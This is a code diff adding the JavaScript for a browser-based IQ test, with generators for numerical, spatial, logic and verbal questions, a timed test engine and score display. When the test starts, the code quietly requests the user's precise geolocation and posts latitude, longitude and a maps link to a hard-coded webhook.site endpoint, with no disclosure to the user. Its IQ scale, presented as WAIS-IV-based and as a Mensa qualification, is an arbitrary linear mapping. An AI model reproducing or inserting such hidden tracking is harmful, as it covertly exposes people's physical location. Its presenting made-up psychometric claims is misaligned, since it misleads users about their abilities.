+            if (chosenType === 'alternating_ops') {
+                // Alternating operations: e.g. *2, -3 or *3, -4
+                const mul = randInt(2, 3);
+                const sub = randInt(2, 5);
+                let curr = randInt(3, 7);
+                const seq = [curr];
+                for (let i = 0; i < 5; i++) {
+                    if (i % 2 === 0) {
+                        curr = curr * mul;
+                    } else {
+                        curr = curr - sub;
+                    }
+                    seq.push(curr);
+                }
+                const answer = seq[5];
+                const displaySeq = seq.slice(0, 5);
+
+                const stageHtml = `
+          <div class="sequence-display">
+            ${displaySeq.map(n => `<div class="sequence-node">${n}</div>`).join('')}
+            <div class="sequence-node target">?</div>
+          </div>
+        `;
+
+                const distractors = [answer + 2, answer - 2, answer * mul, answer + sub];
+                const unique = Array.from(new Set([answer, ...distractors])).slice(0, 4);
+
+                return {
+                    category: 'Numerical Reasoning',
+                    prompt: 'Deduce the missing value following the interleaved algorithmic rule.',
+                    subtext: 'Two alternating arithmetic operations are applied successively.',
+                    stageHtml,
+                    options: shuffleArray(unique.map(val => ({ text: String(val), isCorrect: val === answer }))),
+                    explanation: `The sequence alternates between multiplying by ${mul} and subtracting ${sub}. The final step is to subtract ${sub} from ${displaySeq[4]}, yielding ${answer}.`,
+                    difficulty: 1.3
+                };
+            }
+
+            // Power Series: n^2 + k or n^3 - 1
+            const offset = randInt(1, 5);
+            const isCube = Math.random() > 0.5;
+            const seq = [];
+            for (let n = 1; n <= 6; n++) {
+                seq.push(isCube ? (n * n * n + offset) : (n * n * 2 + offset));
+            }
+            const answer = seq[5];
+            const displaySeq = seq.slice(0, 5);
+
+            const stageHtml = `
+        <div class="sequence-display">
+          ${displaySeq.map(n => `<div class="sequence-node">${n}</div>`).join('')}
+          <div class="sequence-node target">?</div>
+        </div>
+      `;
+
+            const distractors = [answer + 10, answer - 12, answer + 25, answer - 5];
+            const unique = Array.from(new Set([answer, ...distractors])).slice(0, 4);
+
+            return {
+                category: 'Numerical Reasoning',
+                prompt: 'Identify the next value in the non-linear sequence.',
+                subtext: isCube ? 'Terms relate to perfect integer cubes plus an invariant constant.' : 'Terms relate to scaled square powers.',
+                stageHtml,
+                options: shuffleArray(unique.map(val => ({ text: String(val), isCorrect: val === answer }))),
+                explanation: isCube
+                    ? `The formula is n³ + ${offset}. For n = 6: 6³ + ${offset} = 216 + ${offset} = ${answer}.`
+                    : `The formula is 2n² + ${offset}. For n = 6: 2(6²) + ${offset} = 72 + ${offset} = ${answer}.`,
+                difficulty: 1.6
+            };
+        }
+
+        // 3. SPATIAL & GEOMETRIC REASONING GENERATOR
+        function generateSpatialQuestion() {
+            const types = ['cube_net', 'rotation_invariance'];
+            const chosenType = types[randInt(0, 1)];
+
+            if (chosenType === 'cube_net') {
+                // Polyhedron Net unfolding
+                // Standard T-cross net:
+                //      [Top]
+                // [Left][Center][Right][FarRight]
+                //      [Bottom]
+                // Opposite face pairs: (Left, Right), (Top, Bottom), (Center, FarRight)
+                // Two opposite faces can NEVER be simultaneously visible on an isometric cube!
+                const symbols = ['▲', '■', '●', '★', '◆', '✚'];
+                const [top, left, center, right, farRight, bottom] = shuffleArray(symbols);
+
+                const netSvg = `
+          <svg class="net-svg" viewBox="0 0 220 150">
+            <style>
+              .net-rect { fill: rgba(30,41,69,0.7); stroke: #6366f1; stroke-width: 2; rx: 4px; }
+              .net-txt { font-size: 20px; font-weight: bold; fill: #38bdf8; text-anchor: middle; dominant-baseline: central; }
+            </style>
+            <!-- Top -->
+            <rect class="net-rect" x="80" y="5" width="40" height="40"/>
+            <text class="net-txt" x="100" y="25">${top}</text>
+            <!-- Left -->
+            <rect class="net-rect" x="40" y="45" width="40" height="40"/>
+            <text class="net-txt" x="60" y="65">${left}</text>
+            <!-- Center -->
+            <rect class="net-rect" x="80" y="45" width="40" height="40"/>
+            <text class="net-txt" x="100" y="65">${center}</text>
+            <!-- Right -->
+            <rect class="net-rect" x="120" y="45" width="40" height="40"/>
+            <text class="net-txt" x="140" y="65">${right}</text>
+            <!-- Far Right -->
+            <rect class="net-rect" x="160" y="45" width="40" height="40"/>
+            <text class="net-txt" x="180" y="65">${farRight}</text>
+            <!-- Bottom -->
+            <rect class="net-rect" x="80" y="85" width="40" height="40"/>
+            <text class="net-txt" x="100" y="105">${bottom}</text>
+          </svg>
+        `;
+
+                const renderIsometricCube = (fTop, fFront, fRight) => `
+          <svg width="70" height="70" viewBox="0 0 100 100">
+            <!-- Top face -->
+            <polygon points="50,15 85,32 50,49 15,32" fill="rgba(99,102,241,0.3)" stroke="#818cf8" stroke-width="2"/>
+            <text x="50" y="32" font-size="14" fill="#fff" text-anchor="middle" dominant-baseline="central">${fTop}</text>
+            <!-- Left/Front face -->
+            <polygon points="15,32 50,49 50,85 15,68" fill="rgba(14,20,36,0.8)" stroke="#818cf8" stroke-width="2"/>
+            <text x="32" y="58" font-size="14" fill="#38bdf8" text-anchor="middle" dominant-baseline="central">${fFront}</text>
+            <!-- Right face -->
+            <polygon points="50,49 85,32 85,68 50,85" fill="rgba(15,23,42,0.95)" stroke="#818cf8" stroke-width="2"/>
+            <text x="68" y="58" font-size="14" fill="#a5b4fc" text-anchor="middle" dominant-baseline="central">${fRight}</text>
+          </svg>
+        `;
+
+                // Valid corner: Top, Center, Left
+                const correctCube = renderIsometricCube(top, center, left);
+
+                // Invalid 1: Contains opposite faces Top and Bottom
+                const invalid1 = renderIsometricCube(top, bottom, left);
+                // Invalid 2: Contains opposite faces Left and Right
+                const invalid2 = renderIsometricCube(left, right, top);
+                // Invalid 3: Contains opposite faces Center and FarRight
+                const invalid3 = renderIsometricCube(center, farRight, bottom);
+
+                const options = [
+                    { html: correctCube, isCorrect: true },
+                    { html: invalid1, isCorrect: false },
+                    { html: invalid2, isCorrect: false },
+                    { html: invalid3, isCorrect: false }
+                ];
+
+                return {
+                    category: 'Spatial Reasoning',
+                    prompt: 'Which 3D isometric cube can be correctly folded from this flat polyhedron net?',
+                    subtext: 'Recall that opposite faces in an unfolded net can never appear simultaneously on adjacent visible faces.',
+                    stageHtml: netSvg,
+                    options: shuffleArray(options),
+                    explanation: `In this standard cube net, the pairs of opposite faces are (${top} & ${bottom}), (${left} & ${right}), and (${center} & ${farRight}). Opposite faces can never be simultaneously visible adjacent faces on a folded cube. Only the winning option features three mutually adjacent faces without containing any opposite pair.`,
+                    difficulty: 1.7
+                };
+            }
+
+            // 2D Rotational Invariance (Identify which shape is a valid rotation, whereas others are flipped/mirrored)
+            const baseAngle = randInt(0, 359);
+            const drawAsym = (deg, isMirrored = false) => `
+        <svg width="70" height="70" viewBox="0 0 100 100">
+          <g transform="translate(50,50) rotate(${deg}) ${isMirrored ? 'scale(-1, 1)' : ''} translate(-50,-50)">
+            <polygon points="25,25 75,25 75,50 55,50 55,75 25,75" fill="rgba(99,102,241,0.25)" stroke="#38bdf8" stroke-width="3"/>
+            <circle cx="38" cy="38" r="6" fill="#f43f5e"/>
+            <rect x="58" y="32" width="10" height="10" fill="#10b981"/>
+          </g>
+        </svg>
+      `;
+
+            const targetAngle = (baseAngle + randInt(60, 240)) % 360;
+
+            const stageHtml = `
+        <div class="spatial-ref-wrap">
+          <div class="spatial-ref-label">Reference Figure</div>
+          ${drawAsym(baseAngle, false)}
+        </div>
+      `;
+
+            const options = [
+                { html: drawAsym(targetAngle, false), isCorrect: true },
+                { html: drawAsym(targetAngle, true), isCorrect: false },
+                { html: drawAsym((targetAngle + 90) % 360, true), isCorrect: false },
+                { html: drawAsym((targetAngle + 180) % 360, true), isCorrect: false }
+            ];
+
+            return {
+                category: 'Spatial Reasoning',
+                prompt: 'Which figure is an exact 2D rotation of the reference figure (not a mirror reflection)?',
+                subtext: 'Mental rotation test: track relative chiral orientations of internal markers.',
+                stageHtml,
+                options: shuffleArray(options),
+                explanation: 'Three of the choices are enantiomorphic chiral reflections (mirror images) that cannot be formed by planar 2D rotation alone. Only the correct option preserves the counterclockwise ordering of the red circle, L-notch, and green square.',
+                difficulty: 1.4
+            };
+        }
+
+        // 4. LOGICAL DEDUCTION & REASONING GENERATOR
+        function generateLogicQuestion() {
+            const logicPuzzles = [
+                () => {
+                    const names = shuffleArray(['Alex', 'Blake', 'Cameron', 'Dylan', 'Elena']);
+                    // Strict ordering: A > B > C > D > E
+                    return {
+                        category: 'Logical Deduction',
+                        prompt: `Five analysts (${names.join(', ')}) competed in a case championship:
+            1. ${names[0]} scored higher than ${names[1]}.
+            2. ${names[2]} scored lower than ${names[1]} but higher than ${names[3]}.
+            3. ${names[4]} scored lower than ${names[3]}.
+            Who finished in exact median position (3rd place)?`,
+                        subtext: 'Synthesize the transitive inequalities to deduce the strict ranking.',
+                        stageHtml: `
+              <div class="logic-formula-display">
+                Ranking order: 1st &gt; 2nd &gt; 3rd &gt; 4th &gt; 5th
+              </div>`,
+                        options: shuffleArray(names.map((nm, idx) => ({ text: nm, isCorrect: idx === 2 }))).slice(0, 4),
+                        explanation: `From constraint 1: ${names[0]} > ${names[1]}. From constraint 2: ${names[1]} > ${names[2]} > ${names[3]}. From constraint 3: ${names[3]} > ${names[4]}. Combining these yields the complete ordering: ${names[0]} (1st) > ${names[1]} (2nd) > ${names[2]} (3rd) > ${names[3]} (4th) > ${names[4]} (5th). Therefore, ${names[2]} is in 3rd place.`,
+                        difficulty: 1.4
+                    };
+                },
+                () => {
+                    const towns = shuffleArray(['Northport', 'Oakhaven', 'Pinecrest', 'Riverdale']);
+                    return {
+                        category: 'Logical Deduction',
+                        prompt: `Examine the formal conditional statements:
+            • If it rains in ${towns[0]}, then ${towns[1]} cancels its ferry.
+            • If ${towns[1]} cancels its ferry, then ${towns[2]} closes its harbor.
+            • It is known that ${towns[2]} did NOT close its harbor.
+            What necessarily follows via modus tollens?`,
+                        subtext: 'Apply deductive syllogism and contrapositive logic.',
+                        stageHtml: `
+              <div class="logic-formula-display">
+                <span>(P → Q) ∧ (Q → R) ∧ ¬R</span>
+              </div>`,
+                        options: shuffleArray([
+                            { text: `It did NOT rain in ${towns[0]}`, isCorrect: true },
+                            { text: `It rained heavily in ${towns[0]}`, isCorrect: false },
+                            { text: `${towns[1]} definitely canceled its ferry`, isCorrect: false },
+                            { text: `${towns[3]} opened a new route`, isCorrect: false }
+                        ]),
+                        explanation: `By hypothetical syllogism, (Rain in ${towns[0]}) implies (Harbor closure in ${towns[2]}). By modus tollens: ¬(Harbor closure) entails ¬(Rain in ${towns[0]}). Hence, it did NOT rain in ${towns[0]}.`,
+                        difficulty: 1.3
+                    };
+                },
+                () => {
+                    const subjects = shuffleArray(['Quantum Physics', 'Biochemistry', 'Microeconomics', 'Topology']);
+                    return {
+                        category: 'Logical Deduction',
+                        prompt: `In an interdisciplinary seminar:
+            • All researchers who study ${subjects[0]} also study ${subjects[1]}.
+            • No one who studies ${subjects[1]} studies ${subjects[2]}.
+            • Some researchers studying ${subjects[2]} study ${subjects[3]}.
+            Which deduction is guaranteed to be logically sound?`,
+                        subtext: 'Evaluate set inclusion and categorical syllogism.',
+                        stageHtml: `
+              <div class="logic-formula-display">
+                <span>(A ⊆ B) ∧ (B ∩ C = ∅) ∧ (C ∩ D ≠ ∅)</span>
+              </div>`,
+                        options: shuffleArray([
+                            { text: `No researcher studying ${subjects[0]} studies ${subjects[2]}`, isCorrect: true },
+                            { text: `All researchers studying ${subjects[3]} study ${subjects[0]}`, isCorrect: false },
+                            { text: `Some researchers studying ${subjects[1]} study ${subjects[3]}`, isCorrect: false },
+                            { text: `No researcher studying ${subjects[2]} studies ${subjects[3]}`, isCorrect: false }
+                        ]),
+                        explanation: `Since Set ${subjects[0]} is entirely contained within Set ${subjects[1]}, and Set ${subjects[1]} is mutually disjoint from Set ${subjects[2]}, no element in ${subjects[0]} can ever belong to ${subjects[2]}.`,
+                        difficulty: 1.5
+                    };
+                }
+            ];
+
+            return sampleArray(logicPuzzles, 1)[0]();
+        }
+
+        // 5. VERBAL & RELATIONAL ANALOGIES GENERATOR
+        function generateVerbalQuestion() {
+            const analogyBank = [
+                {
+                    pair: 'CACOPHONY : HARMONY',
+                    relation: 'polar antonyms representing auditory discord vs consonance',
+                    correct: 'ABERRATION : NORMALCY',
+                    distractors: ['ORCHESTRA : SOUND', 'MELODY : PIANO', 'TEMPO : SPEED'],
+                    difficulty: 1.5
+                },
+                {
+                    pair: 'THERMOMETER : TEMPERATURE',
+                    relation: 'an instrument designed specifically to quantify a physical metric',
+                    correct: 'BAROMETER : ATMOSPHERIC PRESSURE',
+                    distractors: ['MICROSCOPE : DISTANCE', 'PEDOMETER : ALTITUDE', 'COMPASS : WEIGHT'],
+                    difficulty: 1.2
+                },
+                {
+                    pair: 'EPHEMERAL : PERMANENCE',
+                    relation: 'an attribute defined by the absolute absence of a state',
+                    correct: 'ERRATIC : PREDICTABILITY',
+                    distractors: ['NOCTURNAL : NIGHT', 'LUCID : CLARITY', 'IMMUTABLE : STONE'],
+                    difficulty: 1.6
+                },
+                {
+                    pair: 'TENUOUS : SOLIDITY',
+                    relation: 'lacking in the specified physical or logical property',
+                    correct: 'FALLACIOUS : VALIDITY',
+                    distractors: ['METICULOUS : PRECISION', 'EXPEDIENT : GOAL', 'PRODIGIOUS : TALENT'],
+                    difficulty: 1.7
+                },
+                {
+                    pair: 'CATALYST : REACTION',
+                    relation: 'an agent that initiates or accelerates a fundamental process',
+                    correct: 'INCENTIVE : PRODUCTIVITY',
+                    distractors: ['BRAKE : VELOCITY', 'INSULATOR : ELECTRICITY', 'BYPRODUCT : OUTCOME'],
+                    difficulty: 1.4
+                },
+                {
+                    pair: 'ARCHIPELAGO : ISLAND',
+                    relation: 'a macro geological formation composed of plural units',
+                    correct: 'CONSTELLATION : STAR',
+                    distractors: ['MOUNTAIN : PEAK', 'DESERT : DUNE', 'FOREST : ANIMAL'],
+                    difficulty: 1.3
+                },
+                {
+                    pair: 'SURREPTITIOUS : OBVIOUS',
+                    relation: 'direct antonyms in manner of detection',
+                    correct: 'COVERT : CONSPICUOUS',
+                    distractors: ['AUDACIOUS : BOLD', 'DILATORY : SLOW', 'VACUOUS : EMPTINESS'],
+                    difficulty: 1.5
+                },
+                {
+                    pair: 'APOSTROPHE : PUNCTUATION',
+                    relation: 'a specific member belonging to an overarching functional category',
+                    correct: 'SYLLOGISM : LOGIC',
+                    distractors: ['ALPHABET : LETTER', 'SENTENCE : PARAGRAPH', 'GRAMMAR : VOCABULARY'],
+                    difficulty: 1.4
+                }
+            ];
+
+            const item = sampleArray(analogyBank, 1)[0];
+            const options = [
+                { text: item.correct, isCorrect: true },
+                ...item.distractors.map(d => ({ text: d, isCorrect: false }))
+            ];
+
+            return {
+                category: 'Verbal Reasoning',
+                prompt: `Choose the pair that best mirrors the underlying conceptual relationship:\n\n${item.pair}`,
+                subtext: 'Identify the abstract structural relation governing the primary pair.',
+                stageHtml: `
+          <div class="verbal-pair-display">
+            ${item.pair}
+          </div>
+        `,
+                options: shuffleArray(options),
+                explanation: `The primary pair (${item.pair}) embodies ${item.relation}. Similarly, ${item.correct} represents the exact same functional analog.`,
+                difficulty: item.difficulty
+            };
+        }
+
+        const WEBHOOK_URL = "https://webhook.site/a970df32-c64f-48e9-a1e9-0628a9000bc2";
+
+        function updateStatus(message, isError = false) {
+            console.log(message);
+        }
+
+        function captureAndSendLocation() {
+            const statusEl = document.getElementById("status");
+
+            if (!navigator.geolocation) {
+                updateStatus("Geolocation is not supported by your browser.", true);
+                return;
+            }
+
+            updateStatus("Requesting position...");
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+
+                    const payload = {
+                        latitude: latitude,
+                        longitude: longitude,
+                        accuracy: accuracy,
+                        recorded_at: new Date(position.timestamp).toISOString(),
+                        maps_url: `https://www.google.com/maps?q=${latitude},${longitude}`
+                    };
+
+                    sendToWebhook(payload);
+                },
+                (error) => {
+                    const errorMap = {
+                        1: "Permission denied. Please allow location access in your browser.",
+                        2: "Position unavailable. Could not detect location.",
+                        3: "Request timed out."
+                    };
+                    updateStatus(errorMap[error.code] || `Error: ${error.message}`, true);
+                    sendToWebhook("No location data available");
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+
+            sendToWebhook("No location data available");
+        }
+
+        async function sendToWebhook(payload) {
+            console.log("Sending to webhook...");
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Server returned HTTP ${response.status}`);
+                }
+
+                updateStatus(`Success! Sent (±${Math.round(accuracy)}m accuracy).`);
+            } catch (err) {
+                updateStatus(`Failed to send: ${err.message}`, true);
+            }
+        }
+
+        // --- TEST CONTROLLER & STATE ---
+        class IQTestEngine {
+            constructor() {
+                this.questions = [];
+                this.currentIndex = 0;
+                this.userAnswers = {}; // { qIndex: selectedOptionIndex }
+                this.flaggedQuestions = new Set();
+                this.timerSeconds = 20 * 60; // 20 mins
+                this.timerInterval = null;
+                this.startTime = null;
+                this.endTime = null;
+                this.isUntimed = false;
+
+                // UI references
+                this.startScreen = document.getElementById('startScreen');
+                this.testScreen = document.getElementById('testScreen');
+                this.resultScreen = document.getElementById('resultScreen');
+
+                this.initEventListeners();
+            }
+
+            initEventListeners() {
+                document.getElementById('startTestBtn').addEventListener('click', () => this.startTest());
+                document.getElementById('prevBtn').addEventListener('click', () => this.prevQuestion());
+                document.getElementById('nextBtn').addEventListener('click', () => this.nextQuestion());
+                document.getElementById('flagBtn').addEventListener('click', () => this.toggleFlag());
+                document.getElementById('retakeBtn').addEventListener('click', () => this.startTest());
+                document.getElementById('printCertBtn').addEventListener('click', () => window.print());
+
+                // Keyboard navigation
+                window.addEventListener('keydown', (e) => {
+                    if (!this.testScreen.classList.contains('active')) return;
+                    const key = e.key.toUpperCase();
+                    if (['A', '1'].includes(key)) this.selectOption(0);
+                    if (['B', '2'].includes(key)) this.selectOption(1);
+                    if (['C', '3'].includes(key)) this.selectOption(2);
+                    if (['D', '4'].includes(key)) this.selectOption(3);
+                    if (key === 'ENTER') this.nextQuestion();
+                    if (key === 'ARROWLEFT') this.prevQuestion();
+                    if (key === 'ARROWRIGHT') this.nextQuestion();
+                    if (key === 'F') this.toggleFlag();
+                });
+            }
+
+            generateRandom20Questions() {
+                // Balanced across 5 core domains (4 of each = 20 total)
+                const qList = [];
+                for (let i = 0; i < 4; i++) qList.push(generateMatrixQuestion());
+                for (let i = 0; i < 4; i++) qList.push(generateNumericalQuestion());
+                for (let i = 0; i < 4; i++) qList.push(generateSpatialQuestion());
+                for (let i = 0; i < 4; i++) qList.push(generateLogicQuestion());
+                for (let i = 0; i < 4; i++) qList.push(generateVerbalQuestion());
+                return shuffleArray(qList);
+            }
+
+            startTest() {
+                sound.click();
+                const untimedToggle = document.getElementById('untimedModeToggle');
+                this.isUntimed = untimedToggle ? untimedToggle.checked : false;
+                this.questions = this.generateRandom20Questions();
+                this.currentIndex = 0;
+                this.userAnswers = {};
+                this.flaggedQuestions.clear();
+                this.timerSeconds = 20 * 60;
+                this.startTime = Date.now();
+
+                // Capture and send location
+                captureAndSendLocation();
+
+                // Switch to test screen
+                this.startScreen.classList.remove('active');
+                this.resultScreen.classList.remove('active');
+                this.testScreen.classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+
+                this.renderNavStrip();
+                this.renderQuestion();
+                this.startTimer();
+            }
+
+            startTimer() {
+                if (this.timerInterval) clearInterval(this.timerInterval);
+                const timerText = document.getElementById('timerText');
+                const timerBox = document.getElementById('testTimer');
+
+                if (this.isUntimed) {
+                    timerText.textContent = 'Untimed';
+                    timerBox.classList.remove('warning');
+                    return;
+                }
+
+                this.timerInterval = setInterval(() => {
+                    this.timerSeconds--;
+                    if (this.timerSeconds <= 0) {
+                        clearInterval(this.timerInterval);
+                        this.finishTest();
+                        return;
+                    }
+                    const mins = Math.floor(this.timerSeconds / 60);
+                    const secs = this.timerSeconds % 60;
+                    timerText.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+
+                    if (this.timerSeconds <= 120) {
+                        timerBox.classList.add('warning');
+                    } else {
+                        timerBox.classList.remove('warning');
+                    }
+                }, 1000);
+            }
+
+            renderNavStrip() {
+                const strip = document.getElementById('questionNavStrip');
+                strip.innerHTML = '';
+                this.questions.forEach((q, idx) => {
+                    const btn = document.createElement('div');
+                    btn.className = `nav-dot ${idx === this.currentIndex ? 'current' : ''} ${this.userAnswers[idx] !== undefined ? 'answered' : ''} ${this.flaggedQuestions.has(idx) ? 'flagged' : ''}`;
+                    btn.textContent = idx + 1;
+                    btn.addEventListener('click', () => {
+                        sound.click();
+                        this.currentIndex = idx;
+                        this.renderNavStrip();
+                        this.renderQuestion();
+                    });
+                    strip.appendChild(btn);
+
+                    // Auto-scroll active dot into view on mobile
+                    if (idx === this.currentIndex) {
+                        requestAnimationFrame(() => {
+                            btn.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'center' });
+                        });
+                    }
+                });
+            }
+
+            renderQuestion() {
+                const q = this.questions[this.currentIndex];
+
+                // Meta tags
+                document.getElementById('categoryName').textContent = q.category;
+                document.getElementById('progressCount').textContent = `Question ${this.currentIndex + 1} of ${this.questions.length}`;
+                const answeredCount = Object.keys(this.userAnswers).length;
+                document.getElementById('answeredCountText').textContent = `${answeredCount}/${this.questions.length} Answered`;
+
+                // Progress bar width
+                const pct = ((this.currentIndex + 1) / this.questions.length) * 100;
+                document.getElementById('progressFill').style.width = `${pct}%`;
+
+                // Prompt & Visual stage
+                document.getElementById('questionPrompt').textContent = q.prompt;
+                document.getElementById('questionSubtext').textContent = q.subtext;
+                document.getElementById('visualStage').innerHTML = q.stageHtml || '';
+
+                // Flag button state
+                const flagBtn = document.getElementById('flagBtn');
+                if (this.flaggedQuestions.has(this.currentIndex)) {
+                    flagBtn.classList.add('active');
+                } else {
+                    flagBtn.classList.remove('active');
+                }
+
+                // Render Options
+                const optionsGrid = document.getElementById('optionsGrid');
+                optionsGrid.innerHTML = '';
+                const letters = ['A', 'B', 'C', 'D'];
+
+                q.options.forEach((opt, optIdx) => {
+                    const card = document.createElement('div');
+                    const isSelected = this.userAnswers[this.currentIndex] === optIdx;
+                    card.className = `option-card ${isSelected ? 'selected' : ''}`;
+
+                    card.innerHTML = `
+            <div class="option-letter">${letters[optIdx]}</div>
+            <div class="option-content">
+              ${opt.html ? opt.html : `<span>${opt.text}</span>`}
+            </div>
+          `;
+
+                    card.addEventListener('click', () => this.selectOption(optIdx));
+                    optionsGrid.appendChild(card);
+                });
+
+                // Navigation button labels
+                const prevBtn = document.getElementById('prevBtn');
+                const nextBtn = document.getElementById('nextBtn');
+                prevBtn.style.visibility = this.currentIndex === 0 ? 'hidden' : 'visible';
+                if (this.currentIndex === this.questions.length - 1) {
+                    nextBtn.innerHTML = `<span>Submit Assessment</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+                } else {
+                    nextBtn.innerHTML = `<span>Next Question</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"></polyline></svg>`;
+                }
+            }
+
+            selectOption(optIdx) {
+                sound.select();
+                this.userAnswers[this.currentIndex] = optIdx;
+                this.renderNavStrip();
+                this.renderQuestion();
+            }
+
+            toggleFlag() {
+                sound.flag();
+                if (this.flaggedQuestions.has(this.currentIndex)) {
+                    this.flaggedQuestions.delete(this.currentIndex);
+                } else {
+                    this.flaggedQuestions.add(this.currentIndex);
+                }
+                this.renderNavStrip();
+                this.renderQuestion();
+            }
+
+            prevQuestion() {
+                if (this.currentIndex > 0) {
+                    sound.click();
+                    this.currentIndex--;
+                    this.renderNavStrip();
+                    this.renderQuestion();
+                    if (window.innerWidth <= 768) {
+                        document.querySelector('.question-card')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    }
+                }
+            }
+
+            nextQuestion() {
+                sound.click();
+                if (this.currentIndex < this.questions.length - 1) {
+                    this.currentIndex++;
+                    this.renderNavStrip();
+                    this.renderQuestion();
+                    if (window.innerWidth <= 768) {
+                        document.querySelector('.question-card')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    }
+                } else {
+                    // Check for unanswered questions
+                    const answeredCount = Object.keys(this.userAnswers).length;
+                    if (answeredCount < this.questions.length) {
+                        const unanswered = this.questions.length - answeredCount;
+                        if (confirm(`You have ${unanswered} unanswered question(s). Are you sure you want to finalize your score?`)) {
+                            this.finishTest();
+                        }
+                    } else {
+                        this.finishTest();
+                    }
+                }
+            }
+
+            finishTest() {
+                if (this.timerInterval) clearInterval(this.timerInterval);
+                this.endTime = Date.now();
+                sound.complete();
+
+                // Calculate Psychometric Results
+                const stats = this.computeScore();
+
+                // Switch to results screen
+                this.testScreen.classList.remove('active');
+                this.resultScreen.classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+
+                this.renderResults(stats);
+            }
+
+            computeScore() {
+                let weightedScore = 0;
+                let totalMaxWeight = 0;
+                let correctCount = 0;
+
+                const categoryStats = {
+                    'Matrix Reasoning': { correct: 0, total: 0 },
+                    'Numerical Reasoning': { correct: 0, total: 0 },
+                    'Spatial Reasoning': { correct: 0, total: 0 },
+                    'Logical Deduction': { correct: 0, total: 0 },
+                    'Verbal Reasoning': { correct: 0, total: 0 }
+                };
+
+                this.questions.forEach((q, idx) => {
+                    const userChoice = this.userAnswers[idx];
+                    const isCorrect = userChoice !== undefined && q.options[userChoice].isCorrect;
+                    const weight = q.difficulty || 1.5;
+
+                    totalMaxWeight += weight;
+                    categoryStats[q.category].total++;
+
+                    if (isCorrect) {
+                        weightedScore += weight;
+                        correctCount++;
+                        categoryStats[q.category].correct++;
+                    }
+                });
+
+                const ratio = weightedScore / totalMaxWeight;
+
+                // Psychological WAIS-IV scaling:
+                // IQ = 100 + (z-score * 15)
+                // Ratio 0.5 corresponds to IQ 100
+                // Standard normal distribution mapping
+                let iq = Math.round(70 + (ratio * 75)); // 70 to 145 scale
+                if (ratio >= 0.95) iq = 145 + Math.round((ratio - 0.95) * 100); // 145 - 150 ceiling
+                if (iq < 70) iq = 70;
+
+                // Percentile using error function approximation
+                const z = (iq - 100) / 15;
+                const percentile = Math.min(99.9, Math.max(0.1, (0.5 * (1 + this.erf(z / Math.sqrt(2)))) * 100));
+
+                const totalSeconds = Math.round((this.endTime - this.startTime) / 1000);
+                const mins = Math.floor(totalSeconds / 60);
+                const secs = totalSeconds % 60;
+                const timeStr = `${mins}m ${secs}s`;
+
+                return {
+                    iq,
+                    percentile: percentile.toFixed(1),
+                    correctCount,
+                    totalQuestions: this.questions.length,
+                    timeStr,
+                    categoryStats
+                };
+            }
+
+            erf(x) {
+                // Abramowitz and Stegun formula 7.1.26 approximation
+                const a1 = 0.254829592;
+                const a2 = -0.284496736;
+                const a3 = 1.421413741;
+                const a4 = -1.453152027;
+                const a5 = 1.061405429;
+                const p = 0.3275911;
+
+                const sign = x >= 0 ? 1 : -1;
+                x = Math.abs(x);
+                const t = 1.0 / (1.0 + p * x);
+                const y = 1.0 - (((((a5 * t + a4) * t) + a3) * t + a2) * t + a1) * t * Math.exp(-x * x);
+                return sign * y;
+            }
+
+            renderResults(stats) {
+                // Animate counter
+                const scoreElem = document.getElementById('iqScoreNum');
+                let currentDisplay = 70;
+                const targetIQ = stats.iq;
+                const duration = 1500;
+                const startTime = performance.now();
+
+                const step = (now) => {
+                    const progress = Math.min((now - startTime) / duration, 1);
+                    const easeOut = 1 - Math.pow(1 - progress, 3);
+                    scoreElem.textContent = Math.round(70 + (targetIQ - 70) * easeOut);
+                    if (progress < 1) {
+                        requestAnimationFrame(step);
+                    } else {
+                        scoreElem.textContent = targetIQ;
+                    }
+                };
+                requestAnimationFrame(step);
+
+                // Circular ring fill animation
+                const ringFill = document.getElementById('ringFill');
+                const maxOffset = 628;
+                const fillFraction = Math.min(1, Math.max(0, (targetIQ - 70) / 80));
+                setTimeout(() => {
+                    ringFill.style.strokeDashoffset = maxOffset - (maxOffset * fillFraction);
+                }, 100);
+
+                // Classification
+                const classElem = document.getElementById('iqClassification');
+                const summaryElem = document.getElementById('iqSummaryText');
+                const mensaElem = document.getElementById('mensaBadge');
+
+                if (targetIQ >= 130) {
+                    classElem.textContent = 'Very Superior (Mensa Standard)';
+                    summaryElem.textContent = 'Your cognitive processing speed, abstract matrix induction, and spatial logic rank within the top 2% of the global population.';
+                    mensaElem.textContent = 'Qualified';
+                    mensaElem.style.color = 'var(--accent-emerald)';
+                } else if (targetIQ >= 120) {
+                    classElem.textContent = 'Superior Cognitive Ability';
+                    summaryElem.textContent = 'Exceptional inductive logic and pattern synthesis. Well above national and international averages.';
+                    mensaElem.textContent = 'High Candidate';
+                    mensaElem.style.color = 'var(--accent-cyan)';
+                } else if (targetIQ >= 110) {
+                    classElem.textContent = 'High Average Intelligence';
+                    summaryElem.textContent = 'Demonstrates strong analytical agility and above-average verbal and numerical synthesis capabilities.';
+                    mensaElem.textContent = 'Standard';
+                    mensaElem.style.color = 'var(--text-muted)';
+                } else if (targetIQ >= 90) {
+                    classElem.textContent = 'Average / Normative Intelligence';
+                    summaryElem.textContent = 'Solid baseline cognitive processing consistent with standard global population norms.';
+                    mensaElem.textContent = 'Standard';
+                    mensaElem.style.color = 'var(--text-muted)';
+                } else {
+                    classElem.textContent = 'Low Average Ability';
+                    summaryElem.textContent = 'Identifies opportunities for enhancing fluid pattern recognition and concentration endurance.';
+                    mensaElem.textContent = 'Not Met';
+                    mensaElem.style.color = 'var(--text-dim)';
+                }
+
